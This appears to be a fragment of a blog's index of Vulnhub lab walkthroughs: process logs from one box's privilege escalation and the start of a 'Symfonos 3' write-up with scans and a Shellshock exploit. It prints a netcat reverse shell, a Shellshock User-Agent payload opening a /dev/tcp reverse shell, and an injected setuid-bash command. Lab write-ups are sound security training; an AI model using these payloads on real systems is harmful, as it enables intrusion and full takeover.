2022/02/06 00:53:31 CMD: UID=1000 PID=751 | bash 2022/02/06 00:53:31 CMD: UID=1000 PID=742 | (sd-pam) 2022/02/06 00:53:31 CMD: UID=1000 PID=741 | /lib/systemd/systemd --user 2022/02/06 00:53:31 CMD: UID=33 PID=739 | su poseidon 2022/02/06 00:53:31 CMD: UID=33 PID=738 | /bin/bash 2022/02/06 00:53:31 CMD: UID=33 PID=737 | python -c import pty;pty.spawn(&quot;/bin/bash&quot;) 2022/02/06 00:53:31 CMD: UID=33 PID=708 | /usr/sbin/apache2 -k start 2022/02/06 00:53:31 CMD: UID=33 PID=707 | bash 2022/02/06 00:53:31 CMD: UID=33 PID=706 | sh -c nc 192.168.110.4 4444 -e /bin/bash 2022/02/06 00:53:31 CMD: UID=33 PID=701 | /usr/sbin/apache2 -k start 2022/02/06 00:53:31 CMD: UID=33 PID=700 | /usr/sbin/apache2 -k start 2022/02/06 00:53:31 CMD: UID=33 PID=699 | /usr/sbin/apache2 -k start 2022/02/06 00:53:31 CMD: UID=33 PID=698 | /usr/sbin/apache2 -k start 2022/02/06 00:53:31 CMD: UID=33 PID=697 | /usr/sbin/apache2 -k start 2022/02/06 00:53:31 CMD: UID=0 PID=651 | /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app 2022/02/06 00:53:31 CMD: UID=0 PID=650 | /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app 2022/02/06 00:53:31 CMD: UID=0 PID=649 | /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app 2022/02/06 00:53:31 CMD: UID=0 PID=6 | 2022/02/06 00:53:31 CMD: UID=0 PID=59 | 2022/02/06 00:53:31 CMD: UID=0 PID=49 | 2022/02/06 00:53:31 CMD: UID=0 PID=48 | 2022/02/06 00:53:31 CMD: UID=0 PID=461 | /usr/sbin/apache2 -k start 2022/02/06 00:53:31 CMD: UID=0 PID=455 | /usr/sbin/sshd -D 2022/02/06 00:53:31 CMD: UID=107 PID=454 | /usr/sbin/mysqld 2022/02/06 00:53:31 CMD: UID=0 PID=4 | 2022/02/06 00:53:31 CMD: UID=0 PID=392 | /sbin/agetty -o -p -- \\u --noclear tty1 linux 2022/02/06 00:53:31 CMD: UID=0 PID=388 | /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app 2022/02/06 00:53:31 CMD: UID=0 PID=343 | /lib/systemd/systemd-logind 2022/02/06 00:53:31 CMD: UID=0 PID=342 | /usr/sbin/anacron -d -q -s 2022/02/06 00:53:31 CMD: UID=0 PID=341 | /usr/sbin/rsyslogd -n -iNONE 2022/02/06 00:53:31 CMD: UID=0 PID=340 | /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant 2022/02/06 00:53:31 CMD: UID=104 PID=339 | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 2022/02/06 00:53:31 CMD: UID=0 PID=338 | /usr/sbin/cron -f 2022/02/06 00:53:31 CMD: UID=0 PID=329 | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3 2022/02/06 00:53:31 CMD: UID=0 PID=301 | 2022/02/06 00:53:31 CMD: UID=0 PID=300 | 2022/02/06 00:53:31 CMD: UID=0 PID=30 | 2022/02/06 00:53:31 CMD: UID=0 PID=3 | 2022/02/06 00:53:31 CMD: UID=0 PID=29 | 2022/02/06 00:53:31 CMD: UID=0 PID=28 | 2022/02/06 00:53:31 CMD: UID=0 PID=27 | 2022/02/06 00:53:31 CMD: UID=0 PID=26 | 2022/02/06 00:53:31 CMD: UID=0 PID=25 | 2022/02/06 00:53:31 CMD: UID=0 PID=24 | 2022/02/06 00:53:31 CMD: UID=0 PID=23 | 2022/02/06 00:53:31 CMD: UID=101 PID=222 | /lib/systemd/systemd-timesyncd 2022/02/06 00:53:31 CMD: UID=0 PID=22 | 2022/02/06 00:53:31 CMD: UID=0 PID=213 | /lib/systemd/systemd-udevd 2022/02/06 00:53:31 CMD: UID=0 PID=21 | 2022/02/06 00:53:31 CMD: UID=0 PID=20 | 2022/02/06 00:53:31 CMD: UID=0 PID=2 | 2022/02/06 00:53:31 CMD: UID=0 PID=194 | /lib/systemd/systemd-journald 2022/02/06 00:53:31 CMD: UID=0 PID=19 | 2022/02/06 00:53:31 CMD: UID=0 PID=18 | 2022/02/06 00:53:31 CMD: UID=0 PID=107 | 2022/02/06 00:53:31 CMD: UID=0 PID=104 | 2022/02/06 00:53:31 CMD: UID=0 PID=101 | 2022/02/06 00:53:31 CMD: UID=0 PID=10 | 2022/02/06 00:53:31 CMD: UID=0 PID=1 | /sbin/init 2022/02/06 00:53:53 CMD: UID=1000 PID=853 | -bash 2022/02/06 00:53:58 CMD: UID=1000 PID=855 | -bash 2022/02/06 00:53:58 CMD: UID=1000 PID=856 | -bash 2022/02/06 00:53:58 CMD: UID=1000 PID=857 | -bash 2022/02/06 00:54:00 CMD: UID=0 PID=858 | 2022/02/06 00:55:07 CMD: UID=1000 PID=872 | -bash 2022/02/06 00:55:07 CMD: UID=1000 PID=873 | -bash 2022/02/06 00:55:08 CMD: UID=1000 PID=874 | -bash 2022/02/06 00:55:12 CMD: UID=0 PID=875 | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3 2022/02/06 00:55:12 CMD: UID=0 PID=876 | /bin/sh /sbin/dhclient-script 2022/02/06 00:55:12 CMD: UID=0 PID=877 | /bin/sh /sbin/dhclient-script 2022/02/06 00:55:12 CMD: UID=0 PID=878 | /bin/sh /sbin/dhclient-script 2022/02/06 00:55:12 CMD: UID=0 PID=879 | /bin/sh /sbin/dhclient-script 2022/02/06 00:55:30 CMD: UID=1000 PID=880 | -bash 2022/02/06 00:55:33 CMD: UID=1000 PID=881 | -bash 2022/02/06 00:57:29 CMD: UID=0 PID=882 | /usr/sbin/anacron -d -q -s 2022/02/06 00:57:29 CMD: UID=0 PID=883 | /bin/sh -c run-parts --report /etc/cron.weekly 2022/02/06 00:57:29 CMD: UID=0 PID=884 | run-parts --report /etc/cron.weekly 2022/02/06 00:57:29 CMD: UID=0 PID=885 | /bin/sh /etc/cron.weekly/0anacron 2022/02/06 00:57:29 CMD: UID=0 PID=887 | run-parts --report /etc/cron.weekly 2022/02/06 00:57:29 CMD: UID=0 PID=886 | anacron -u cron.weekly 2022/02/06 00:57:49 CMD: UID=0 PID=888 | 2022/02/06 00:59:41 CMD: UID=0 PID=889 | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3 2022/02/06 00:59:41 CMD: UID=0 PID=890 | /bin/sh /sbin/dhclient-script 2022/02/06 00:59:41 CMD: UID=0 PID=891 | /bin/sh /sbin/dhclient-script 2022/02/06 00:59:41 CMD: UID=0 PID=892 | /bin/sh /sbin/dhclient-script 2022/02/06 00:59:41 CMD: UID=0 PID=893 | /bin/sh /sbin/dhclient-script 2022/02/06 01:01:38 CMD: UID=1000 PID=894 | -bash 2022/02/06 01:02:29 CMD: UID=0 PID=896 | /sbin/init 2022/02/06 01:02:29 CMD: UID=0 PID=895 | /usr/sbin/anacron -d -q -s 2022/02/06 01:02:29 CMD: UID=0 PID=897 | /bin/sh -c run-parts --report /etc/cron.monthly 2022/02/06 01:02:29 CMD: UID=0 PID=898 | run-parts --report /etc/cron.monthly 2022/02/06 01:02:29 CMD: UID=0 PID=899 | /bin/sh /etc/cron.monthly/0anacron 2022/02/06 01:03:01 CMD: UID=0 PID=901 | 2022/02/06 01:03:39 CMD: UID=0 PID=902 | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3 2022/02/06 01:03:39 CMD: UID=0 PID=903 | /bin/sh /sbin/dhclient-script 2022/02/06 01:03:39 CMD: UID=0 PID=904 | /bin/sh /sbin/dhclient-script 2022/02/06 01:03:39 CMD: UID=0 PID=905 | ip -4 addr change 192.168.110.17/255.255.255.0 broadcast 192.168.110.255 valid_lft 600 preferred_lft 600 dev enp0s3 label enp0s3 2022/02/06 01:03:39 CMD: UID=0 PID=906 | /bin/sh /sbin/dhclient-script 2022/02/06 01:08:12 CMD: UID=0 PID=907 | 2022/02/06 01:08:24 CMD: UID=0 PID=908 | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3 2022/02/06 01:08:24 CMD: UID=0 PID=909 | /bin/sh /sbin/dhclient-script 2022/02/06 01:08:24 CMD: UID=0 PID=910 | /bin/sh /sbin/dhclient-script 2022/02/06 01:08:24 CMD: UID=0 PID=911 | /bin/sh /sbin/dhclient-script 2022/02/06 01:08:24 CMD: UID=0 PID=912 | /bin/sh /sbin/dhclient-script 2022/02/06 01:09:01 CMD: UID=0 PID=913 | /usr/sbin/CRON -f 2022/02/06 01:09:01 CMD: UID=0 PID=914 | /usr/sbin/CRON -f 2022/02/06 01:09:01 CMD: UID=0 PID=915 | /sbin/init 2022/02/06 01:09:01 CMD: UID=0 PID=919 | /bin/sh -e /usr/lib/php/sessionclean 2022/02/06 01:09:01 CMD: UID=0 PID=918 | /bin/sh -e /usr/lib/php/sessionclean 2022/02/06 01:09:01 CMD: UID=0 PID=917 | /bin/sh -e /usr/lib/php/sessionclean 2022/02/06 01:09:01 CMD: UID=0 PID=916 | /bin/sh -e /usr/lib/php/sessionclean 2022/02/06 01:09:01 CMD: UID=0 PID=920 | /bin/sh -e /usr/lib/php/sessionclean 2022/02/06 01:09:01 CMD: UID=0 PID=921 | /bin/sh /usr/sbin/phpquery -V 2022/02/06 01:09:01 CMD: UID=0 PID=922 | /bin/sh /usr/sbin/phpquery -V 2022/02/06 01:09:01 CMD: UID=0 PID=924 | /bin/sh /usr/sbin/phpquery -V 2022/02/06 01:09:01 CMD: UID=0 PID=923 | /bin/sh /usr/sbin/phpquery -V 2022/02/06 01:09:01 CMD: UID=0 PID=925 | /bin/sh /usr/sbin/phpquery -V 2022/02/06 01:09:01 CMD: UID=0 PID=926 | /bin/sh /usr/sbin/phpquery -V 2022/02/06 01:09:01 CMD: UID=0 PID=927 | /bin/sh -e /usr/lib/php/sessionclean 2022/02/06 01:09:01 CMD: UID=0 PID=929 | /bin/sh -e /usr/lib/php/sessionclean 2022/02/06 01:09:01 CMD: UID=0 PID=958 | find /proc/699/fd -ignore_readdir_race -lname 2022/02/06 01:11:51 CMD: UID=1000 PID=965 | -bash 2022/02/06 01:12:48 CMD: UID=0 PID=966 | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3 2022/02/06 01:12:48 CMD: UID=0 PID=967 | /bin/sh /sbin/dhclient-script 2022/02/06 01:12:48 CMD: UID=0 PID=968 | /bin/sh /sbin/dhclient-script 2022/02/06 01:12:48 CMD: UID=0 PID=969 | /bin/sh /sbin/dhclient-script 2022/02/06 01:12:48 CMD: UID=0 PID=970 | /bin/sh /sbin/dhclient-script 2022/02/06 01:13:24 CMD: UID=0 PID=971 | 2022/02/06 01:15:25 CMD: UID=1000 PID=972 | -bash 2022/02/06 01:15:27 CMD: UID=1000 PID=973 | -bash 2022/02/06 01:15:30 CMD: UID=1000 PID=975 | -bash 2022/02/06 01:15:30 CMD: UID=1000 PID=976 | -bash 2022/02/06 01:15:30 CMD: UID=1000 PID=977 | -bash 2022/02/06 01:15:30 CMD: UID=1000 PID=978 | -bash 2022/02/06 01:16:16 CMD: UID=1000 PID=979 | -bash 2022/02/06 01:16:25 CMD: UID=1000 PID=980 | -bash 2022/02/06 01:16:46 CMD: UID=0 PID=986 | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3 2022/02/06 01:16:46 CMD: UID=0 PID=987 | /bin/sh /sbin/dhclient-script 2022/02/06 01:16:46 CMD: UID=0 PID=988 | /bin/sh /sbin/dhclient-script 2022/02/06 01:16:46 CMD: UID=0 PID=989 | /bin/sh /sbin/dhclient-script 2022/02/06 01:16:46 CMD: UID=0 PID=990 | /bin/sh /sbin/dhclient-script 2022/02/06 01:17:01 CMD: UID=0 PID=991 | /usr/sbin/CRON -f 2022/02/06 01:17:01 CMD: UID=0 PID=992 | /usr/sbin/CRON -f 2022/02/06 01:17:01 CMD: UID=0 PID=993 | /bin/sh -c cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly 2022/02/06 01:17:58 CMD: UID=0 PID=999 | /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app 2022/02/06 01:17:58 CMD: UID=0 PID=1000 | /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app 2022/02/06 01:17:58 CMD: UID=0 PID=1002 | cp /bin/bash /tmp/rootbash 2022/02/06 01:17:58 CMD: UID=0 PID=1001 | sh -c cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash 2022/02/06 01:17:58 CMD: UID=0 PID=1003 | sh -c cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash 2022/02/06 01:18:35 CMD: UID=0 PID=1004 | 2022/02/06 01:19:32 CMD: UID=1000 PID=1005 | -bash ... ... 2022/02/06 01:46:22 CMD: UID=0 PID=1132 | /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app 2022/02/06 01:46:23 CMD: UID=0 PID=1133 | /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app 2022/02/06 01:46:23 CMD: UID=0 PID=1135 | sh -c cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash 2022/02/06 01:46:23 CMD: UID=0 PID=1134 | sh -c cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash 2022/02/06 01:46:23 CMD: UID=0 PID=1136 | sh -c cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash 00:53:31: gunicorn is executed 01:17:58: gunicorn is executed again, creating rootbash 01:46:22: gunicorn is executed However, I am unsure why it gunicorn was executed repeatedly, I added import os os.system(&quot;cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash&quot;) to app.py and proceed to do the other exploit (JsonPickle), when I was done w/ the JsonPickle exploit, I found out that /tmp/rootbash is created, did not physically restart the VM. Root shell obtained " }, { "title": "Vulnhub - Symfonos 3", "url": "/posts/Symfonos-3/", "categories": "Vulnhub, Linux", "tags": "exploit/shell-shock, linux-priv-esc/cronjob, linux-priv-esc/python-hijacking", "date": "2022-02-05 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Fri Feb 4 03:37:59 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Symfonos-3/192.168.110.12/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Symfonos-3/192.168.110.12/scans/xml/_full_tcp_nmap.xml 192.168.110.12adjust_timeouts2: packet supposedly had rtt of -531024 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -531024 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -531015 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -531015 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -531756 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -531756 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -529653 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -529653 microseconds. Ignoring time.Nmap scan report for 192.168.110.12Host is up, received arp-response (0.00061s latency).Scanned at 2022-02-04 03:38:00 +08 for 17sNot shown: 65532 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack ttl 64 ProFTPD 1.3.5b22/tcp open ssh syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: | 2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDK0oaDrdLT7VSjY1FV9llkwWSCIm/t8s6PnjgkyBm01dLPZwMPupDHRDs0hTAPu8ULa5FmXEc9JnHYQQQ07ZACw1RmDEyWWtkOY90lVHfFEIv6LCviLpzw/qW9o6RCmu/cV24FvMzU7tjWedOu21ZXGQgMSq2HfQWV2Hr5+mRbUFeh6HIBYd7v2tbATO+dPii3cF52KgD9/KgSZX2Mj4ZK/JW8E7c3kZPhtqAfrg7nPuhl0T02uk1mD6PIRqNag1SHYWRhvfIb3rP2vbSNAxpzwPp31u5+Iee7c3NBxpqOFFw143TzwMO+CRwdaJWI9dbsLoNvJYn96YjmPO0Y86Bl| 256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEogzxRYvlNzB6cgNCHP6IB3h5LWSrGWbI1c46IQ2JiPR2Bfo04xA+nGxuGekG3WmjkK2dC5u+xsCR6ihBXDpjU=| 256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHZVA1Masiw/GOsw3RTrujE9a9BtwyxHF9w53yqKs5RG80/tcp open http syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Site doesn&#39;t have a title (text/html).|_http-server-header: Apache/2.4.25 (Debian)MAC Address: 08:00:27:6F:72:9C (Oracle VirtualBox virtual NIC)OS fingerprint not ideal because: maxTimingRatio (1.404000e+00) is greater than 1.4Aggressive OS guesses: Linux 3.13 (96%), Linux 3.2 - 4.9 (96%), Linux 3.16 - 4.6 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Linux 2.6.32 (92%), Linux 3.8 (92%), Linux 2.6.32 - 3.10 (92%), Linux 3.10 - 4.11 (91%)No exact OS matches for host (test conditions non-ideal).TCP/IP fingerprint:SCAN(V=7.92%E=4%D=2/4%OT=21%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61FC2F29%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=8)SEQ(TI=Z%CI=Z%II=I%TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 198.839 days (since Tue Jul 20 07:30:14 2021)Network Distance: 1 hopIP ID Sequence Generation: All zerosService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.61 ms 192.168.110.12Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Feb 4 03:38:17 2022 -- 1 IP address (1 host up) scanned in 19.80 secondsTCP/21 (FTP) Anonymous access is disabledTCP/80 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/Symfonos-3]└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.12/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________cgi-bin/.php [Status: 403, Size: 279, Words: 20, Lines: 10]cgi-bin/ [Status: 403, Size: 279, Words: 20, Lines: 10]cgi-bin/.html [Status: 403, Size: 279, Words: 20, Lines: 10].htpasswd [Status: 403, Size: 279, Words: 20, Lines: 10]gate [Status: 301, Size: 315, Words: 20, Lines: 10]index.html [Status: 200, Size: 241, Words: 24, Lines: 23]index.html [Status: 200, Size: 241, Words: 24, Lines: 23]server-status [Status: 403, Size: 279, Words: 20, Lines: 10]:: Progress: [18460/18460] :: Job [1/1] :: 8806 req/sec :: Duration: [0:00:05] :: Errors: 0 :: cgi-bin/ gate index.htmlInitial FootholdTCP/80 (HTTP) - Shell Shock View enumerated directories index.html “Can you bust the underworld” gate cgi-bin/ Forbidden Fuzz for more directories in gate/ directory-2.3-medium, found nothing common.txt, found nothing Fuzz for more directories in cgi-bin/ ┌──(root💀kali)-[~/vulnHub/Symfonos-3] └─# ffuf -u http://$ip/cgi-bin/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e &#39;.html,.txt,.cgi,.php&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.12/cgi-bin/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Extensions : .html .txt .cgi .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ [Status: 403, Size: 279, Words: 20, Lines: 10] .html [Status: 403, Size: 279, Words: 20, Lines: 10] .php [Status: 403, Size: 279, Words: 20, Lines: 10] underworld [Status: 200, Size: 65, Words: 14, Lines: 2] :: Progress: [1102800/1102800] :: Job [1/1] :: 5799 req/sec :: Duration: [0:03:17] :: Errors: 0 :: underworld Proceed to underworld A cgi-bin script is executed, could be vulnerable to Shellshock Determine whether the webserver is susceptible to shellshock ┌──(root💀kali)-[~/vulnHub/Symfonos-3] └─# curl -A &quot;() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;&quot; http://$ip/cgi-bin/underworld cerberus Exploited before @ TryHackMe: 0day Execute reverse shell ┌──(root💀kali)-[~/vulnHub/Symfonos-3] └─# curl -H &#39;User-Agent: () { :; }; /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.110.4/4444 0&amp;gt;&amp;amp;1&#39; http://$ip/cgi-bin/underworld Privilege EscalationHades - Via Cronjob + TCPDump Linpeas hades running proftpd cerberus belongs to the pcap group tcpdump is available Look for proftpd logs cerberus@symfonos3:/var/log/proftpd$ cd /var/log cerberus@symfonos3:/var/log$ ls -la total 2636 drwxr-xr-x 8 root root 4096 Jul 20 2019 . drwxr-xr-x 12 root root 4096 Jul 19 2019 .. -rw-r--r-- 1 root root 21941 Apr 6 2020 alternatives.log drwxr-x--- 2 root adm 4096 Jul 19 2019 apache2 drwxr-xr-x 2 root root 4096 Apr 6 2020 apt -rw-r----- 1 root adm 129794 Feb 3 23:18 auth.log -rw------- 1 root utmp 1536 Feb 3 23:06 btmp -rw-r----- 1 root adm 126990 Feb 3 23:14 daemon.log -rw-r----- 1 root adm 194227 Feb 3 21:36 debug -rw-r--r-- 1 root root 439846 Apr 6 2020 dpkg.log drwxr-s--- 2 Debian-exim adm 4096 Feb 3 22:57 exim4 -rw-r----- 1 root adm 6850 Feb 3 23:06 fail2ban.log -rw-r--r-- 1 root root 32064 Jul 20 2019 faillog drwxr-xr-x 3 root root 4096 Jul 19 2019 installer -rw-r----- 1 root adm 521046 Feb 3 23:02 kern.log -rw-rw-r-- 1 root utmp 292584 Feb 3 22:36 lastlog -rw-r----- 1 root adm 356263 Feb 3 23:02 messages drwxr-xr-x 2 root root 4096 Jul 20 2019 proftpd -rw-r----- 1 root adm 695870 Feb 3 23:18 syslog drwxr-x--- 2 root adm 4096 Apr 6 2020 unattended-upgrades -rw-r----- 1 root adm 354 Jul 20 2019 user.log -rw-rw-r-- 1 root utmp 110592 Feb 3 23:18 wtmp proftpd directory View files in proftpd cerberus@symfonos3:/var/log$ cd proftpd/ cerberus@symfonos3:/var/log/proftpd$ ls -la total 68 drwxr-xr-x 2 root root 4096 Jul 20 2019 . drwxr-xr-x 8 root root 4096 Jul 20 2019 .. -rw-r----- 1 root root 0 Jul 20 2019 controls.log -rw-r----- 1 root root 50145 Feb 3 23:18 proftpd.log -rw-r--r-- 1 root root 1004 Jul 20 2019 xferlog cerberus@symfonos3:/var/log/proftpd$ only xferlog is readable View xferlog cerberus@symfonos3:/var/log/proftpd$ cat xferlog Sat Jul 20 03:43:47 2019 0 localhost 251 /home/hades/statuscheck.txt b _ i r hades ftp 0 * c Sat Jul 20 03:44:30 2019 0 localhost 251 /home/hades/statuscheck.txt b _ i r hades ftp 0 * c Sat Jul 20 03:49:42 2019 0 localhost 251 /srv/ftp/statuscheck.txt b _ i r hades ftp 0 * c Sat Jul 20 03:58:01 2019 0 localhost 0 /opt/client/statuscheck.txt b _ i r hades ftp 0 * c Sat Jul 20 03:59:01 2019 0 localhost 0 /opt/client/statuscheck.txt b _ i r hades ftp 0 * c Sat Jul 20 04:00:01 2019 0 localhost 0 /opt/client/statuscheck.txt b _ i r hades ftp 0 * c Sat Jul 20 04:01:01 2019 0 localhost 0 /opt/client/statuscheck.txt b _ i r hades ftp 0 * c Sat Jul 20 04:02:01 2019 0 localhost 0 /opt/client/statuscheck.txt b _ i r hades ftp 0 * c Sat Jul 20 04:03:01 2019 0 localhost 0 /opt/client/statuscheck.txt b _ i r hades ftp 0 * c Sat Jul 20 04:04:01 2019 0 localhost 0 /opt/client/statuscheck.txt b _ i r hades ftp 0 * c Sat Jul 20 04:06:01 2019 0 localhost 0 /opt/client/statuscheck.txt b _ i r hades ftp 0 * c cerberus@symfonos3:/var/log/proftpd$ Based on the timing, we can tell that statuscheck.txt is being generated every minute There is probably a cronjob running as root that is generating statuscheck.txt Sniff processes w/ pspy64 to actually see the cronjob being executed cerberus@symfonos3:/tmp$ ./pspy64 pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855 ██▓███ ██████ ██▓███ ▓██ ██▓ ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒ ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░ ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░ ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░ ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒ ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░ ░░ ░ ░ ░ ░░ ▒ ▒ ░░ ░ ░ ░ ░ ░ ... 2022/02/04 00:40:02 CMD: UID=0 PID=10519 | /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 2022/02/04 00:40:02 CMD: UID=0 PID=10520 | /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 2022/02/04 00:40:02 CMD: UID=0 PID=10521 | cp /bin/bash /tmp/rootbash 2022/02/04 00:40:02 CMD: UID=0 PID=10522 | 2022/02/04 00:40:02 CMD: UID=0 PID=10523 | /usr/sbin/CRON -f 2022/02/04 00:40:02 CMD: UID=105 PID=10524 | /usr/sbin/sendmail -i -FCronDaemon -B8BITMIME -oem root 2022/02/04 00:40:02 CMD: UID=1000 PID=10525 | /usr/sbin/exim4 -Mc 1nFsGI-0002jj-38 2022/02/04 00:41:01 CMD: UID=0 PID=10526 | /usr/sbin/CRON -f 2022/02/04 00:41:01 CMD: UID=0 